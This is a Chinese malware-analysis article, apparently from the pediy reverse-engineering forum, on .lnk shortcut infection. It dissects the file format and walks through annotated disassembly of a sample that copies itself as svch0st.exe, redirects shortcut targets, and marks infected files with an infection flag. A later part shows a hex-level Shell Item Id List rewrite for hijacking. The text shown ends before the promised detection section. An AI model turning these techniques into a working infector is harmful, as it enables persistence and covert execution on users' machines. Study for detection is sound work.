
# Windows 平台.lnk 文件感染技术研究

> 原文：[`www.pediy.com/kssd/pediy11/110426.html`](https://www.pediy.com/kssd/pediy11/110426.html)

## 目录

- `0x01` 简介
- `0x02` lnk 文件格式解析
- `0x03` 感染 lnk 文件实现细节
- `0x04` 另一类感染思路
- `0x05` 关于检测
- `0x06` 其它

## `0x01` 简介

感染 `Windows` 平台下的 `.lnk` 文件并不是新的技术，但由于其隐蔽性好，操作动作简单，极易躲避主动防御技术，在执行 `payload` 前，可绕过绝大多数的主流 `HIPS`。同时，由于大多数反病毒引擎的格式分析也缺乏对 `.lnk` 的分析，使得这种感染方式被忽略。下面将分析最新的 `.lnk` 感染技术，同时提供一个其检测的方案。

## `0x02` lnk 文件格式解析

由于 `.lnk` 文件提供丰富的调用方式，因此在研究该文件类型格式的基础上可以发现有很多字段可以被恶意利用。下面是一个 `.lnk` 文件格式的通用结构，也就是说 `.lnk` 文件是由这样不同的节组成的，但这些节并不是全都必须存在。

```
.lnk 文件格式
+---------------------------+
| lnk file header           |      
+---------------------------+ >------.
| Shell Item Id List        |        |
+---------------------------+        |
| File location info        |        |
+---------------------------+        |
| Description string        |        |
+---------------------------+       ---
| Relative path string      |  这几个节不是每一个都必须存在，如果存在就要按这样的顺序关系排列。
+---------------------------+       ---
| Working directory string  |        |
+---------------------------+        |
| Command line string       |        |
+---------------------------+        |
| Icon filename string      |        |
+---------------------------+ >------.
| Extra stuff               |
+---------------------------+
```

1. 首先是文件头 `lnk file header` 结构，这里记录了比较重要的文件信息，无论是恶意代码的感染还是用于检测，都需要对该结构有所了解，下面是文件头结构参考数据。

| Offset | Size/Type | Description |
| :--- | :--- | :--- |
| `0x00` | `1 dword` | 总是为 `0000004CH`，相当于字符 `"L"`，用于标识是否是个有效的 `.lnk` 文件。 |
| `0x04` | `16 bytes` | `GUID`，标识 `.lnk` 的唯一标识符，不排除以后 `MS` 对该字段有所修改。 |
| `0x14` | `1 dword` | \*重要，`Flags` 用来标识 `.lnk` 文件中有哪些可选属性，也就是哪些节是可选的。 |
| `0x18` | `1 dword` | 目标文件属性（是否只读、隐藏、系统文件、加密、临时...） |
| `0x1c` | `1 qword` | 文件创建时间 |
| `0x24` | `1 qword` | 文件修改时间 |
| `0x2c` | `1 qword` | 文件最后一次访问时间 |
| `0x34` | `1 dword` | 目标文件长度 |
| `0x38` | `1 dword` | 自定义图标个数 |
| `0x3c` | `1 dword` | 目标文件执行时窗口显示方式（`1`-正常显示，`2`-最小化，`3`-最大化） |
| `0x40` | `1 dword` | 热键 |
| `0x44` | `2 dword` | 该字段未知，常为 `0` |

偏移 `0x14` 处的值含义：

| bit | 该 bit 置 1 |
| :--- | :--- |
| `0` | 包含 `shell item id list` 节，通过修改文件过滤掉该节，不影响 `.lnk` 执行目标文件，但影响其它功能。 |
| `1` | 指向文件或文件夹，如果此位为 `0` 表示指向其他。 |
| `2` | 存在描述字符串 |
| `3` | 存在相对路径 |
| `4` | 存在工作路径 |
| `5` | 存在命令行参数 |
| `6` | 存在自定义图标 \*--> 该位置一般用于病毒判断是否感染目标文件的标志。 |

2. `Shell Item Id List` 节是个可选结构，由文件头中 `offset 0x14` 位置处的值来决定，`0 bit` 值为 `1` 时，表示该 `lnk` 文件包含该结构。

如果存在该结构，偏移 `0x4c` 的位置的一个 `unsigned short int` 是 `Shell Item Id List` 结构的大小标识，后面紧跟一个 `SHITEMID` 结构，该结构体定义如下：

```c
typedef struct _SHITEMID
{
    unsigned short int cb;
    unsigned char abID[0];
}SHITEMID,*LPSHITEMID;
```

`cb` 标识一项 `SHITEMID` 结构大小，`abID` 是可变结构，存储数据具体数据，里面的含义有些未知，但第 `0` 项里面的数据是不能修改的，否则 `.lnk` 文件无法运行。

```
Shell Item Id List 结构

  /- +-------------------------------+
  |  |size (该节总长度)              |------> 该项如果修改，会导致.lnk 无法运行,如果含有命令参数，也会混乱。
  |  +-------------------------------+
  |  |SHITEMID[0]                    |------> 该项所有值一般固定为，unsigned char data[20] = {
  V  +-------------------------------+           0x14, 0x00, 0x1F, 0x50, 0xE0, 0x4F, 0xD0, 0x20, 0xEA, 0x3A, 0x69, 0x10, 0xA2, 0xD8, 0x08,
 size |SHITEMID[1]                    |------\    0x00, 0x2B, 0x30, 0x30, 0x9D}，也可能是其他值。
  A  +-------------------------------+       |    也就是 cb=0x0014，修改任意值都会导致.lnk 无法运行。
  |  |...                              |       |     
  |  |                                 |       .------> 该项 cb 的值一般固定为 0x19(也可能是别的值)。abID 的值为指向目标程序所在盘符的字符串
  |  |                                 |                如"C:\\"，该段空间数据可以任意修改。
  |  |                                 |------\
  |  +-------------------------------+       |  -----> 修改会影响.lnk 文件执行。
  |  |SHITEMID[n]                     |------/  
  \- +-------------------------------+
```

3. `File location info`，一般指文件信息节，是个可选结构，由文件头中 `offset 0x14` 位置处的值来决定，`1 bit` 值为 `1` 时，表示该 `lnk` 文件包含该结构。

| Offset | Size/Type | Description |
| :--- | :--- | :--- |
| `0x00` | `1dword` | 该节总长度，该值的修改，会影响 `.lnk` 文件执行或命令参数混乱失效。 |
| `0x04` | `1dword` | 固定为 `0x1c`，指明为该节长度，该值可任意修改。 |
| `0x08` | `1dword` | `flags` 标志，指示文件在哪些卷有效，例如是本地卷标还是网络卷标。 |
| `0x0c` | `1dword` | 固定为 `0x1c`，本地卷信息表偏移。 |
| `0x10` | `1dword` | 指明目标文件路径相对本节头部的偏移，但 `.lnk` 文件执行目标程序并不依赖于该值指向的路径是否正确。 |
| `0x14` | `1dword` | 网络卷信息表偏移，如果 `flags` 标记含有网络卷的话，否则为 `0`。 |
| `0x18` | `1dword` | 剩余偏移路径，一般都指向本节的末尾，也就是节总长度减 `1` 的值，当该值指向的位置为 `0` 时（大多数情况下都是 `0`），该值可任意修改。 |

`flags` 具体含义：

- 如果目标文件是本地文件，那么文件名称 = 本地路径信息 + 剩余偏移路径
- 如果目标文件是网络文件，那么文件名称 = 网络卷中共享名称 + 剩余偏移路径

接着 `File location info` 节的数据是，本地卷信息表，及网络卷信息表。

本地卷信息表结构如下：

| Offset | Size/Type | Description |
| :--- | :--- | :--- |
| `0x00` | `1dword` | 本地卷信息表的长度，该值可任意修改。 |
| `0x04` | `1dword` | 卷类型（网络盘，软盘，硬盘，可移动...后面有说明），该值可以任意修改。 |
| `0x08` | `1dword` | 标识卷序列号，`2byte` 一组，该值可任意修改。 |
| `0x0c` | `1dword` | 卷名称的偏移，固定为 `0x10`，该值可以任意修改。 |
| `0x10` | 可变长度 | 卷名称，其大小由该表总长度决定。 |

网络卷信息表结构如下：

| Offset | Size/Type | Description |
| :--- | :--- | :--- |
| `0x00` | `1dword` | 网络卷信息表的长度，该值可任意修改。 |
| `0x04` | `1dword` | 固定为 `0x2` |
| `0x08` | `1dword` | 固定为 `0x14` |
| `0x0c` | `1dword` | 固定为 `0` |
| `0x10` | 可变长度 | 固定为 `0x20000` |
| `0x10` | 可变长度 | 网络共享名 |

4. `Description string` 一般指描述字符节，是个可选结构，由文件头中 `offset 0x14` 位置处的值来决定，`2 bit` 值为 `1` 时，表示该 `lnk` 文件包含该结构。

该节开始是个 `unsigned short int` 表示该节的长度，不包含这 `2byte`，由于该字符串的描述字符为 `unicode` 字符，所以取得该值后还得乘以 `2`。

该字符也就是右键查看快捷方式信息中的“起始位置(S)”中的那个描述，该值修改不影响 `.lnk` 文件执行。

5. `Relative path string` 一般指相对路径节，是个可选结构，由文件头中 `offset 0x14` 位置处的值来决定，`3 bit` 值为 `1` 时，表示该 `lnk` 文件包含该结构。

该节结构同上。

6. `Working directory string` 一般指工作路径节，是个可选结构，由文件头中 `offset 0x14` 位置处的值来决定，`4 bit` 值为 `1` 时，表示该 `lnk` 文件包含该结构。

该节结构同上。

7. `Command line string` 一般指命令行节，是个可选结构，由文件头中 `offset 0x14` 位置处的值来决定，`5 bit` 值为 `1` 时，表示该 `lnk` 文件包含该结构。

该节结构同上。

8. `Icon filename string` 一般指自定义图标节，是个可选结构，由文件头中 `offset 0x14` 位置处的值来决定，`6 bit` 值为 `1` 时，表示该 `lnk` 文件包含该结构。

该节结构同上。

9. 附加数据节，里面的数据具体含义未知，有些里面会包含一些本机机器名称。

以上就是对 `.lnk` 文件格式的简要分析，对 `.lnk` 进行感染最主要的就是偷换 `.lnk` 指向的目标文件路径，这点和映像劫持有些类似。同时保留原目标文件路径，留在后面调用，以防感染后被人察觉到快捷方式失效，这样在恶意程序后台启动后，还会调用原目标文件。

## `0x03` 感染 lnk 文件实现细节

同感染 `PE` 文件类似，感染 `.lnk` 文件也都要先解决以下几个问题：

1. 哪些文件是需要感染的？
2. 如何设置感染标记，防止重复感染？
3. 何时执行原目标程序？

对于问题 `1`，一般是感染那些执行频率最高的程序的 `.lnk` 文件，依据个人习惯，很多人喜欢桌面放很多快捷方式，那么这里就是要感染的主要地方。如果隐藏一点的就是 `\Favorites` 目录，`\My Pictures` 目录，`\「开始」菜单\程序` 目录等等...，为了不去感染系统文件的 `.lnk`，可以通过自定义图标一项来过滤一下。

对于问题 `2`，同 `PE` 文件一样，对文件结构中不影响程序执行的字段都是可以设置感染标记的位置，只是如何设置的隐蔽性强一些要考虑一下。

对于问题 `3`，恶意程序后台运行后，最方便的执行方式就是把原目标程序放到命令行节中。

下面以一个获得的样本的来说明感染 `lnk` 的一种方式：

1. 获得被感染文件的目录

```
0040109F    push eax                     ; /pHandle
004010A0    push 1                       ; |Access = KEY_QUERY_VALUE
004010A2    push esi                     ; |Reserved
004010A3    push svch0st.0040309C         ; |Subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
004010A8    push 80000001                ; |hKey = HKEY_CURRENT_USER
004010AD    call dword ptr ds:[<&ADVAPI32.RegOpenKeyExA>]      ; \RegOpenKeyExA
004010B3    test eax,eax
004010B5    je short svch0st.004010BE
004010B7    push esi                     ; /ExitCode
```



```
004010B8    call dword ptr ds:[<&KERNEL32.ExitProcess>]        ; \ExitProcess

004010BE    mov eax,dword ptr ss:[esp+18]

004010C2    lea ecx,dword ptr ss:[esp+20]

004010C6    lea edx,dword ptr ss:[esp+36C]

004010CD    push ecx                                  ; /pBufSize

004010CE    push edx                                  ; |Buffer

004010CF    push esi                                  ; |pValueType

004010D0    push esi                                  ; |Reserved

004010D1    push svch0st.00403090                     ; |ValueName = "Programs" // 感染 “C:\Documents and Settings\xxx\「开始」菜单\程序” 目录

004010D6    push eax                                  ; |hKey

004010D7    call dword ptr ds:[<&ADVAPI32.RegQueryValueExA>]   ; \RegQueryValueExA

004010DD    test eax,eax

004010DF    je short svch0st.004010EC

004010E1    mov ecx,dword ptr ss:[esp+18]

004010E5    push ecx                                  ; /hKey

004010E6    call dword ptr ds:[<&ADVAPI32.RegCloseKey>]        ; \RegCloseKey

004010EC    push ebx

004010ED    lea edx,dword ptr ss:[esp+370]

004010F4    push edi

004010F5    push edx                                  ; /Path

004010F6    call dword ptr ds:[<&KERNEL32.SetCurrentDirectoryA>]; \SetCurrentDirectoryA // 设置要感染的目录

004010FC    lea ecx,dword ptr ss:[esp+18]

00401100    call <jmp.&MFC42.#540>

00401105    lea eax,dword ptr ss:[esp+77C]

0040110C    push 104                                  ; /BufSize = 104 (260.)

00401111    push eax                                  ; |PathBuffer

00401112    push esi                                  ; |hModule

00401113    mov dword ptr ss:[esp+DDC],esi                ; |

0040111A    call dword ptr ds:[<&KERNEL32.GetModuleFileNameA>] ; \GetModuleFileNameA

00401120    lea ecx,dword ptr ss:[esp+170]

00401127    push 104                                  ; /BufSize = 104 (260.)

0040112C    push ecx                                  ; |Buffer

0040112D    call dword ptr ds:[<&KERNEL32.GetSystemDirectoryA>>; \GetSystemDirectoryA

00401133    lea edx,dword ptr ss:[esp+170]

0040113A    lea ecx,dword ptr ss:[esp+18]

0040113E    push edx

0040113F    call <jmp.&MFC42.#860>

00401144    push svch0st.00403080                     ;  ASCII "\svch0st.exe"

00401149    lea ecx,dword ptr ss:[esp+1C]

0040114D    call <jmp.&MFC42.#941>

00401152    mov eax,dword ptr ss:[esp+18]

00401156    push esi                                  ; /FailIfExists

00401157    lea ecx,dword ptr ss:[esp+780]                ; |

0040115E    push eax                                  ; |NewFileName

0040115F    push ecx                                  ; |ExistingFileName

00401160    call dword ptr ds:[<&KERNEL32.CopyFileA>]          ; \CopyFileA       //拷贝自身到%system%目录，重命名为 svch0st.exe
```

2 得到一个操作 .lnk 文件的 COM 接口指针，搜索感染目录文件。

```
00401185    push edx           ; // edx = 0x13f18;                    arg5 = 0x13f18(获取接口的一个指针)

00401186    push svch0st.00402120 ; // [svch0st.00402120] = 0x214ee  ==> arg4 = IID_IShellLink

0040118B    push 1             ; // CLSCTX_INPROC_SERVER = 1         arg3 = CLSCTX_INPROC_SERVER;

0040118D    push esi           ; // esi = 0;                          arg2 = 0

0040118E    push svch0st.00402110 ；// [svch0st.00402110] = 0x21401  ==> arg1 = CLSID_ShellLink

00401193    call dword ptr ds:[<&ole32.CoCreateInstance>]       ;  ole32.CoCreateInstance

00401199    cmp eax,esi

0040119B    jl svch0st.004013D1

004011A1    mov eax,dword ptr ss:[esp+C]

004011A5    lea edx,dword ptr ss:[esp+14]

004011A9    mov dword ptr ss:[esp+14],esi

004011AD    push edx

004011AE    mov ecx,dword ptr ds:[eax]

004011B0    push svch0st.00402130 ;arg2 = IID_IPersistFile

//-----------------------------------------------------------------
;[svch0st.00402130]在内存中的数据

;00402130  0000010B

;00402134  00000000

;00402138  000000C0

;0040213c  46000000

由 OBJIDL.H 中的 IID_IPersistFile 定义可知

EXTERN_C const IID IID_IPersistFile;

#if defined(__cplusplus) && !defined(CINTERFACE)

    MIDL_INTERFACE("0000010b-0000-0000-C000-000000000046") //和这个定义一致

    IPersistFile : public IPersist

    {

    public:

        virtual HRESULT STDMETHODCALLTYPE IsDirty( void) = 0;

        virtual HRESULT STDMETHODCALLTYPE Load( 

            /* [in] */ LPCOLESTR pszFileName,

            /* [in] */ DWORD dwMode) = 0;

        virtual HRESULT STDMETHODCALLTYPE Save( 

            /* [unique][in] */ LPCOLESTR pszFileName,

            /* [in] */ BOOL fRemember) = 0;

        virtual HRESULT STDMETHODCALLTYPE SaveCompleted( 

            /* [unique][in] */ LPCOLESTR pszFileName) = 0;

        virtual HRESULT STDMETHODCALLTYPE GetCurFile( 

            /* [out] */ LPOLESTR __RPC_FAR *ppszFileName) = 0;

    };

    ...

//-----------------------------------------------------------------------

004011B5    push eax            ;// arg1 = IPersistFile *pf

004011B6    call dword ptr ds:[ecx] ;//相当于 IShellLink->QueryInterface(IID_IPersistFile, &pf))

004011B8    cmp eax,esi

004011BA    jl svch0st.004013C7

004011C0    lea eax,dword ptr ss:[esp+30]

004011C4    push eax                                  ; /pFindFileData

004011C5    push svch0st.00403068                     ; |FileName = "*.lnk"

004011CA    call dword ptr ds:[<&KERNEL32.FindFirstFileA>]     ; \FindFirstFileA

004011D0    cmp eax,-1

004011D3    mov dword ptr ss:[esp+24],eax

004011D7    je svch0st.004013BD

004011DD    push ebp

004011DE    /lea ecx,dword ptr ss:[esp+60]

004011E2    |push ecx                                 ; /FileName

004011E3    |call dword ptr ds:[<&KERNEL32.GetFileAttributesA>>; \GetFileAttributesA

004011E9    |push 0                                   ; /hTemplateFile = NULL

004011EB    |push 80                                  ; |Attributes = NORMAL

004011F0    |push 3                                   ; |Mode = OPEN_EXISTING

004011F2    |push 0                                   ; |pSecurity = NULL

004011F4    |push 1                                   ; |ShareMode = FILE_SHARE_READ

004011F6    |lea edx,dword ptr ss:[esp+74]              ; |

004011FA    |push 80000000                             ; |Access = GENERIC_READ

004011FF    |push edx                                 ; |FileName

00401200    |mov ebp,eax                               ; |

00401202    |call dword ptr ds:[<&KERNEL32.CreateFileA>]      ; \CreateFileA

00401208    |mov edi,eax

0040120A    |cmp edi,-1

0040120D    |jnz short svch0st.00401217

0040120F    |push 0                                   ; /ExitCode = 0

00401211    |call dword ptr ds:[<&KERNEL32.ExitProcess>]      ; \ExitProcess

00401217    |push 0                                   ; /pFileSizeHigh = NULL

00401219    |push edi                                 ; |hFile

0040121A    |call dword ptr ds:[<&KERNEL32.GetFileSize>]      ; \GetFileSize

00401220    |mov ebx,eax

00401222    |push ebx                                 ; /MemSize

00401223    |push 40                                  ; |Flags = GPTR

00401225    |call dword ptr ds:[<&KERNEL32.GlobalAlloc>]      ; \GlobalAlloc

0040122B    |mov esi,eax

0040122D    |lea eax,dword ptr ss:[esp+30]

00401231    |push 0                                   ; /pOverlapped = NULL
```



### 00401233-0040123D 检测感染条件前置操作

```
00401233    |push eax                            ; |pBytesRead
00401234    |push ebx                            ; |BytesToRead
00401235    |push esi                            ; |Buffer
00401236    |push edi                            ; |hFile
00401237    |call dword ptr ds:[<&KERNEL32.ReadFile>]       ; \ReadFile
0040123D    |push edi                            ; /hObject
0040123E    |call dword ptr ds:[<&KERNEL32.CloseHandle>]    ; \CloseHandle
```

#### 3 检测感染条件

```
00401244    xor eax,eax
00401246    xor ecx,ecx
00401248    mov al,byte ptr ds:[esi+14]  ;// al = flags[0], 因 esi 指向.lnk 文件数据内存拷贝的首地址，[esi + 14] 指向 lnk file header 的 flags 标识
0040124B    mov ch,byte ptr ds:[esi+15]  ;// ch = flags[1]
0040124E    xor edx,edx              ;// eax = (WORD)flags
00401250    or eax,ecx
00401252    mov dl,byte ptr ds:[esi+16]  ;// dl = flags[2]
00401255    xor ecx,ecx
00401257    mov cl,byte ptr ds:[esi+17]  ;// cl = flags[3]
0040125A    shl edx,10
0040125D    or eax,edx
0040125F    shl ecx,18
00401262    or eax,ecx               ;// eax = DWORD(flags)
00401264    shr eax,6
00401267    and al,1
00401269    cmp al,1                 ;// 比较 flags 的第 6bit 是否置 1
0040126B    jnz svch0st.00401391     ;// 没有置 1 则继续搜索下一个文件
```

前面提到过文件头偏移 `0x14` 处的值含义，当第 `6bit` 置 `1` 时，表示存在自定义图标。也就是该病毒仅感染存在自定义图标的 `.lnk` 文件，这样的图标更多存在于非系统的第三方程序当中。

#### 4 对原执行目标文件进行劫持

```
00401289    |call dword ptr ds:[<&KERNEL32.MultiByteToWid>; MultiByteToWideChar
0040128F    |mov eax,dword ptr ss:[esp+18]
00401293    |lea ecx,dword ptr ss:[esp+684]
0040129A    |push 0
0040129C    |push ecx
0040129D    |mov edx,dword ptr ds:[eax]
0040129F    |push eax
004012A0    |call dword ptr ds:[edx+14] ;//edx 指向 IPersistFile 的指针，由 IPersistFileVtbl 定义可知，call [edx + 14] => IPersistFile->Load(arg1,arg2)
004012A3    |test eax,eax
004012A5    |jl svch0st.00401391
004012AB    |mov eax,dword ptr ss:[esp+10]
004012AF    |lea ecx,dword ptr ss:[esp+278]
004012B6    |push 100
004012BB    |push ecx
004012BC    |mov edx,dword ptr ds:[eax]
004012BE    |push eax
004012BF    |call dword ptr ds:[edx+18]; // edx 指向 IShellLinkA，由 DECLARE_INTERFACE_(IShellLinkA, IUnknown)定义可知，call [edx+18] = > IShellLinkA->GetDescription(arg1,arg2)
004012C2    |lea edx,dword ptr ss:[esp+278]
004012C9    |push svch0st.0040303C                 ; /String2 = "Once"
004012CE    |push edx                               ; |String1
004012CF    |call dword ptr ds:[<&KERNEL32.lstrcmpA>]     ; \lstrcmpA
004012D5    |test eax,eax
004012D7    |je svch0st.00401391                  ;如果.lnk 文件的描述信息不是"Once",说明还没被感染过，否则跳过该文件继续搜索
004012DD    |mov eax,dword ptr ss:[esp+10]
004012E1    |lea edx,dword ptr ss:[esp+A8C]
004012E8    |push 1
004012EA    |push edx
004012EB    |mov ecx,dword ptr ds:[eax]
004012ED    |lea edx,dword ptr ss:[esp+588]
004012F4    |push 104
004012F9    |push edx
004012FA    |push eax
004012FB    |call dword ptr ds:[ecx+C] ;//相当于 IShellLink->GetPath(arg1,arg2,arg3,arg4)
004012FE    |mov eax,dword ptr ss:[esp+10]
00401302    |lea edx,dword ptr ss:[esp+20]
00401306    |push edx
00401307    |push eax
00401308    |mov ecx,dword ptr ds:[eax]
0040130A    |call dword ptr ds:[ecx+38];//相当于 IShellLink->GetShowCmd(arg1)
0040130D    |mov eax,dword ptr ss:[esp+20]
00401311    |lea ecx,dword ptr ss:[esp+580]
00401318    |push eax                               ; /<%d>
00401319    |push ecx                               ; |<%s>
0040131A    |lea edx,dword ptr ss:[esp+BD4]         ; |
00401321    |push svch0st.0040302C                 ; |Format = "@@@@*%s*%d"
00401326    |push edx                               ; |s
00401327    |call dword ptr ds:[<&USER32.wsprintfA>]      ; \wsprintfA
```

该调用相当于给 `.lnk` 文件加入一个命令行节，将原目标文件保持在命令行节中，同时将原目标程序窗口显示方式保存在最后。一个可能的调用情况如下：

`c:\windows\system32\svch0st.exe "@@@@*C:\DOCUME~1\ALLUSE~1\DOCUME~1\xxx.exe*1"`

```
0040132D    |mov eax,dword ptr ss:[esp+20]
00401331    |add esp,10
00401334    |lea edx,dword ptr ss:[esp+BCC]
0040133B    |mov ecx,dword ptr ds:[eax]
0040133D    |push edx
0040133E    |push eax
0040133F    |call dword ptr ds:[ecx+2C] ;// 相当于 IShellLink->SetArguments(arg1),保存上面的命令行参数到被感染的.lnk 文件
00401342    |mov eax,dword ptr ss:[esp+10]
00401346    |lea edx,dword ptr ss:[esp+174]
0040134D    |push edx
0040134E    |push eax
0040134F    |mov ecx,dword ptr ds:[eax]
00401351    |call dword ptr ds:[ecx+50];// 相当于 IShellLink->SetPath(arg1),修.lnk 的目标文件为"c:\windows\system\svch0st.exe"
00401354    |mov eax,dword ptr ss:[esp+10]
00401358    |push 1
0040135A    |push eax
0040135B    |mov ecx,dword ptr ds:[eax]
0040135D    |call dword ptr ds:[ecx+3C] ;// 相当于 IShellLink->SetShowCmd(SW_SHOWNORMAL)
00401360    |mov eax,dword ptr ss:[esp+10]
00401364    |push svch0st.0040303C                 ;  ASCII "Once"
00401369    |push eax
0040136A    |mov edx,dword ptr ds:[eax]
0040136C    |call dword ptr ds:[edx+1C];// 相当于 IShellLink->SetDescription("Once"),设置上感染标志
0040136F    |mov eax,dword ptr ss:[esp+18]
00401373    |lea edx,dword ptr ss:[esp+684]
0040137A    |push 0
0040137C    |push edx
0040137D    |mov ecx,dword ptr ds:[eax]
0040137F    |push eax
00401380    |call dword ptr ds:[ecx+18];// IPersistFile->Save,保存修改
00401383    |mov eax,dword ptr ss:[esp+10]
00401387    |push 2
00401389    |push 0
0040138B    |push eax
0040138C    |mov ecx,dword ptr ds:[eax]
0040138E    |call dword ptr ds:[ecx+4C] ;//IShellLink->Resolve
00401391    |push esi                               ; /hMem
00401392    |call dword ptr ds:[<&KERNEL32.GlobalFree>]   ; \GlobalFree
00401398    |lea edx,dword ptr ss:[esp+60]
0040139C    |push ebp                               ; /FileAttributes
0040139D    |push edx                               ; |FileName
0040139E    |call dword ptr ds:[<&KERNEL32.SetFileAttribu>; \SetFileAttributesA
004013A4    |mov ecx,dword ptr ss:[esp+28]
004013A8    |lea eax,dword ptr ss:[esp+34]
004013AC    |push eax                               ; /pFindFileData
004013AD    |push ecx                               ; |hFile
004013AE    |call dword ptr ds:[<&KERNEL32.FindNextFileA>>; \FindNextFileA
004013B4    |test eax,eax
004013B6    \jnz svch0st.004011DE ;//循环搜索要感染的文件
```

#### 5 执行原目标文件

```
004013D8    call dword ptr ds:[<&KERNEL32.GetCommandLineA>; [GetCommandLineA 获得一个"@@@@*ori_path*sw_show" 格式的字符串
004013DE    lea edx,dword ptr ss:[esp+884]
004013E5    push eax                               ; /String2
004013E6    push edx                               ; |String1
004013E7    call dword ptr ds:[<&KERNEL32.lstrcpyA>]      ; \lstrcpyA
004013ED    mov ax,word ptr ds:[403028]
004013F3    lea ecx,dword ptr ss:[esp+884]
004013FA    push svch0st.00403028                 ; /s2 = "*"
004013FF    push ecx                               ; |s1
00401400    mov word ptr ss:[esp+16],ax            ; |
00401405    call dword ptr ds:[<&MSVCRT.strstr>]          ; \strstr  查找格式中是否有 ' * '
0040140B    add esp,8
0040140E    test eax,eax
00401410    je short svch0st.00401457
00401412    mov esi,dword ptr ds:[<&MSVCRT.strtok>]      ;  msvcrt.strtok
00401418    lea edx,dword ptr ss:[esp+E]
0040141C    lea eax,dword ptr ss:[esp+884]
```



```
00401423    push edx                              ; /s2
00401424    push eax                              ; |s1
00401425    call esi                              ; \strtok  分离命令行的参数 1
00401427    lea ecx,dword ptr ss:[esp+16]
0040142B    push ecx                              ; /s2
0040142C    push 0                                ; |s1 = NULL
0040142E    call esi                              ; \strtok  分离命令行的参数 2，就是原目标程序路径 arg2
00401430    lea edx,dword ptr ss:[esp+1E]
00401434    mov edi,eax
00401436    push edx                              ; /s2
00401437    push 0                                ; |s1 = NULL
00401439    call esi                              ; \strtok  分离命令行的参数 3，也就是原目标程序的现实方式 arg6
0040143B    movsx eax,byte ptr ds:[eax]
0040143E    add esp,18                            ; /IsShown
00401441    sub eax,30                            ; 转换字符的显示方式到数字的显示方式
00401444    push eax                              ; arg6
00401445    push 0                                ; |Operation = NULL
00401447    push 0
00401449    push edi                              ;arg2
0040144A    push svch0st.00403020                 ; |hWnd = 00403020
0040144F    push 0
00401451    call dword ptr ds:[<&SHELL32.ShellExecuteA>]    ;  SHELL32.ShellExecuteA
```

以上就是一个对`.lnk`文件进行感染的过程分析。

### [0x04].另一类感染思路

做为一般性的感染，在不考虑执行原目标文件的情况下，最方便的方式就是直接的修改原目标文件路径，存放原目标文件的路径在`.lnk`文件中共有 4 处，

2 处是 `ascii string`,2 处是 `unicode string`，`ascii string` 与 `unicode string` 成对出现，一处是可选节 `Shell Item Id List` 中，一处是可选节 `File location info` 中。

可尝试对这几处进行修改，来推断哪些和执行目标文件相关联。

反复测试后可发现,`.lnk` 在执行目标文件时，并不依赖于 `File location info` 偏移 `0x10` 处的目标程序路径。而仅依赖于 `Shell Item Id List` 中的 `unicode stirng` 描述，

`Shell Item Id List` 是由 `SHITEMID` 结构组成，虽然里面的有些数据具体含义未知，但可以分析出，在创建`.lnk`文件中它是将一个目标程序执行路径分离若干个节，

例如一个目标程序是 `c:\aaa\bbb\ccc\ddd\eee\f.exe`，则由此生成的 `Shell Item Id List` 结构如下：

* `SHITEMID[0]` -> 其值固定
* `SHITEMID[1]` -> `c:\???`
* `SHITEMID[2]` -> `???aaa???`
* `SHITEMID[3]` -> `???bbb???`
* `SHITEMID[4]` -> `???ccc???`
* `SHITEMID[5]` -> `???ddd???`
* `SHITEMID[6]` -> `???eee???`
* `SHITEMID[7]` -> `???f.exe???`

这些 `unicode string` 的值影响着目标程序的执行，所以有两种方式进行劫持,

1. 直接在此基础上修改目标文件路径，但由于该节的大小是固定的，最好的方式是仅修改 `SHITEMID[7]` 数据，把新的目标文件拷贝到原目标问同路径下，修改一个文件名称即可，比如修改 `SHITEMID[7]` -> `???g.exe???`
2. 因`.lnk` 文件的节中的数据使用的都是相对偏移，而不是绝对偏移，这使得我们可以构造一个新的 `Shell Item Id List` 结构来替换原有 `Shell Item Id List` 结构，而不必担心影响后面的数据。

例如一个 `C:\Documents and Settings\xxx\My Documents\My Pictures\示例图片.lnk` 的 `Shell Item Id List` 节数据

```
Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F
00000040                                             DA 00 14 00                 ?..
00000050   1F 50 E0 4F D0 20 EA 3A  69 10 A2 D8 08 00 2B 30   .P??i.⒇..+0
00000060   30 9D 32 00 2E 00 0C 00  00 00 00 00 00 00 00 00   0?.............
00000070   00 00 00 00 74 1A 59 5E  96 DF D3 48 8D 67 17 33   ....t.Y^.3
00000080   BC EE 28 BA 47 1A 03 59  72 3F A7 44 89 C5 55 95   碱(..Yr?U?
00000090   FE 6B 30 EE 5A 00 31 00  00 00 00 00 57 3B C5 42   0.1.....W;
000000A0   11 00 4D 59 50 49 43 54  7E 31 00 00 42 00 03 00   ..MYPICT~1..B...
000000B0   04 00 EF BE 57 3B AC 42  57 3B D7 42 14 00 2C 00   ..锞 W;W;..,.
000000C0   4D 00 79 00 20 00 50 00  69 00 63 00 74 00 75 00   M.y. .P.i.c.t.u.
000000D0   72 00 65 00 73 00 00 00  40 73 68 65 6C 6C 33 32   r.e.s...@shell32
000000E0   2E 64 6C 6C 2C 2D 32 38  39 39 37 00 18 00 38 00   .dll,-28997...8.
000000F0   35 00 00 00 00 00 57 3B  D7 42 11 00 3A 79 8B 4F   5.....W;..:y
00000100   FE 56 47 72 00 00 20 00  03 00 04 00 EF BE 57 3B   Gr.. .....锞 W;
00000110   C5 42 57 3B D7 42 14 00  00 00 3A 79 8B 4F FE 56   W;....:y
00000120   47 72 00 00 18 00 00                             Gr.....
```

构造一个新的 `Shell Item Id List`,使其指向 `c:\Program Files\Internet Explorer\iexplore.exe`

```
Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F
00000040                                             17 01 14 00                 ....
00000050   1F 50 E0 4F D0 20 EA 3A  69 10 A2 D8 08 00 2B 30   .P??i.⒇..+0
00000060   30 9D 19 00 2F 43 3A 5C  00 00 00 00 00 00 00 00   0?./C:\\........
00000070   00 00 00 00 00 00 00 00  00 00 00 4A 00 31 00 00   ...........J.1..
00000080   00 00 00 31 3C DA 71 11  00 50 52 4F 47 52 41 7E   ...1<..PROGRA~
00000090   31 00 00 32 00 03 00 04  00 EF BE 57 3B 8C 41 3B   1..2.....锞 W;;
000000A0   3C 8A 6B 14 00 00 00 50  00 72 00 6F 00 67 00 72   <....P.r.o.g.r
000000B0   00 61 00 6D 00 20 00 46  00 69 00 6C 00 65 00 73   .a.m. .F.i.l.e.s
000000C0   00 00 00 18 00 52 00 31  00 00 00 00 00 8E 3B 86   .....R.1.....??
000000D0   10 10 00 49 4E 54 45 52  4E 7E 31 00 00 3A 00 03   ...INTERN~1..:..
